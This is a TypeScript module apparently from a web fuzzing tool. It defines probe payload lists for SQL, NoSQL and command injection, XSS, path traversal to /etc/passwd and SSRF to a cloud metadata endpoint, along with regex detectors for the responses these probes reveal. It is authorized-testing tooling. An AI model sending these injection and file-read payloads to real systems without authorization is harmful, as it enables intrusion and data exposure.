/**
 * Non-destructive vulnerability *probes* for Fuzz presets — strings that reveal a weakness in a
 * response (an error message, a reflected tag, a timing difference) without deleting, modifying
 * or actually exploiting anything. For authorized testing of systems you own only.
 */
export interface PayloadSet {
  id: string;
  label: string;
  /** What this probe set looks for and how to read the results. */
  hint: string;
  values: string[];
}

export const PAYLOAD_SETS: PayloadSet[] = [
  {
    id: 'sqli',
    label: 'SQL injection (error-based probes)',
    hint: 'Look for a database error message, a 500, or a response that differs from the baseline in the Flags column.',
    values: [
      "'",
      '"',
      "''",
      "' OR '1'='1",
      "' OR '1'='1' -- ",
      "' OR 1=1-- ",
      "admin'-- ",
      "' AND 1=CONVERT(int,'x')-- ",
      "' AND 1=1-- ",
      "' AND 1=2-- ",
      "1' ORDER BY 10-- ",
      "' UNION SELECT NULL-- ",
      '1;SELECT 1',
      '1 OR 1=1',
    ],
  },
  {
    id: 'sqli-time',
    label: 'SQL injection (time-based blind)',
    hint: 'Compare the Time column: a request several seconds slower than the others suggests the delay function executed server-side.',
    values: [
      "' OR SLEEP(5)-- ",
      "'; WAITFOR DELAY '0:0:5'-- ",
      "' OR pg_sleep(5)-- ",
      '1) OR SLEEP(5)-- ',
    ],
  },
  {
    id: 'xss',
    label: 'Cross-site scripting (reflection probes)',
    hint: 'A hit means the marker (devlensXSS1) comes back in the body WITHOUT being HTML-escaped (e.g. "<script>" instead of "&lt;script&gt;").',
    values: [
      '<script>devlensXSS1</script>',
      '"><svg onload=devlensXSS1>',
      "'><img src=x onerror=devlensXSS1>",
      '<devlensXSS1>',
      '${7*7}devlensXSS1',
      '{{7*7}}devlensXSS1',
    ],
  },
  {
    id: 'path-traversal',
    label: 'Path traversal',
    hint: 'Look for file contents (e.g. "root:" from /etc/passwd, or a Windows file listing) instead of the normal response.',
    values: [
      '../../../../etc/passwd',
      '..\\..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '/etc/passwd',
    ],
  },
  {
    id: 'cmd-injection',
    label: 'Command injection',
    hint: 'A hit means command output (e.g. a directory listing, "uid=...") appears in the response, or the response takes a few extra seconds (sleep).',
    values: ['; id', '| id', '`id`', '$(id)', '; sleep 5', '&& sleep 5'],
  },
  {
    id: 'ssrf',
    label: 'SSRF / open redirect',
    hint: 'A hit means the server actually fetched or redirected to an internal/loopback address, or a cloud metadata endpoint.',
    values: [
      'http://127.0.0.1',
      'http://localhost',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]',
      'file:///etc/passwd',
      '//evil.example',
    ],
  },
  {
    id: 'nosqli',
    label: 'NoSQL injection',
    hint: 'A hit means the request is treated as a query operator instead of a literal value (often an auth bypass).',
    values: ['{"$gt":""}', '{"$ne":null}', 'true, $where: "1 == 1"', "' || '1'=='1"],
  },
];

/** Known vulnerability indicators to scan a response body/headers for. */
export interface Signal {
  id: string;
  label: string;
  severity: 'warn' | 'bad';
}

const ERROR_PATTERNS: [RegExp, string][] = [
  [/you have an error in your sql syntax|warning.*mysqli|mysqlclient|mysql_fetch/i, 'MySQL error'],
  [/unterminated quoted string|sqlite3\.OperationalError/i, 'SQLite error'],
  [/ORA-\d{5}/, 'Oracle error'],
  [/postgresql.*error|pg::syntaxerror/i, 'PostgreSQL error'],
  [/unclosed quotation mark|microsoft ole db|sqlserver/i, 'SQL Server error'],
  [/system\.data\.sqlclient|npgsql\./i, '.NET SQL error'],
  [/django\.db\.utils|psycopg2\./i, 'Django/psycopg2 error'],
  [/warning.*\bpg_/i, 'PHP PostgreSQL warning'],
];
const STACK_TRACE =
  /(traceback \(most recent call last\)|at [\w.$]+\([\w.]+:\d+:\d+\)|\.java:\d+\)|exception in thread|stack trace:)/i;
const ROOT_FILE = /root:.*:0:0:|daemon:.*:1:1:/;
const WIN_INI = /\[fonts\]|\[extensions\]|for 16-bit app support/i;
const UID_OUTPUT = /uid=\d+\([\w-]+\)\s+gid=\d+/;

/** Scans one response for known vulnerability indicators. Pure and offline — no network calls. */
export function detectSignals(
  probeValue: string,
  bodyText: string,
  headers: { name: string; value: string }[],
): Signal[] {
  const out: Signal[] = [];
  for (const [re, label] of ERROR_PATTERNS) {
    if (re.test(bodyText)) out.push({ id: 'db-error', label, severity: 'bad' });
  }
  if (STACK_TRACE.test(bodyText))
    out.push({ id: 'stack-trace', label: 'Stack trace in response', severity: 'warn' });
  if (ROOT_FILE.test(bodyText))
    out.push({ id: 'path-traversal', label: '/etc/passwd contents', severity: 'bad' });
  if (WIN_INI.test(bodyText))
    out.push({ id: 'path-traversal', label: 'win.ini contents', severity: 'bad' });
  if (UID_OUTPUT.test(bodyText))
    out.push({ id: 'cmd-injection', label: 'Shell command output (uid=…)', severity: 'bad' });

  if (
    probeValue.includes('devlensXSS1') &&
    /[<>]/.test(probeValue) &&
    bodyText.includes(probeValue)
  ) {
    out.push({
      id: 'xss-reflected',
      label: 'Payload reflected unescaped (possible XSS)',
      severity: 'bad',
    });
  }
  if (/\{\{7\*7\}\}|\$\{7\*7\}/.test(probeValue) && /\b49\b/.test(bodyText)) {
    out.push({
      id: 'ssti',
      label: 'Template expression evaluated to 49 (possible SSTI)',
      severity: 'bad',
    });
  }

  const contentLength = headers.find((h) => h.name.toLowerCase() === 'content-length')?.value;
  if (contentLength && Number(contentLength) !== bodyText.length && bodyText.length === 0) {
    out.push({ id: 'empty-body', label: 'Server declared a body but sent none', severity: 'warn' });
  }
  return out;
}
